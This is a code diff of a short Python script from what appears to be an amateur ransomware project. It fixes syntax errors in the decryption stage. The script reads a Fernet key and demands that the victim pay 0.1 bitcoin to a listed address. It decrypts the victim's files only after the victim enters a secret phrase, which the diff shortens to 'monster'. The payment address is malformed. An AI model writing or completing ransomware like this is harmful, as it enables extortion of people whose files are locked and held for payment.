@@ -1,6 +1,5 @@
 import os
 from cryptography.fernet import Fernet
-
 #Trouver des fichier
 
 files = []
@@ -15,7 +14,7 @@ print(files)
 with open ("thekey.key", "rb") as key:
     secretkey =key.read()
 
-secret_phrase = "monster energy pipeline punch 500ml"
+secret_phrase = "monster"
 user_phrase = input ("Enter a secret phrases to decrypt the files after you pay me 0.1 bitcoin at this adress '0x082838R8ufefuizh37493794948GHJEZHE383920' ")
 if secret_phrase == user_phrase :
     for file in files:
@@ -23,8 +22,8 @@ if secret_phrase == user_phrase :
             contents = thefile.read()
         contents_decrypted = Fernet(secretkey).decrypt(contents)
         with open(file, "wb") as thefile:
-            thefile.write(contents_decrypted
+            thefile.write(contents_decrypted)
         print("congrats youre files are decrypted")
-else
+else:
         print("No still encrypted")
 
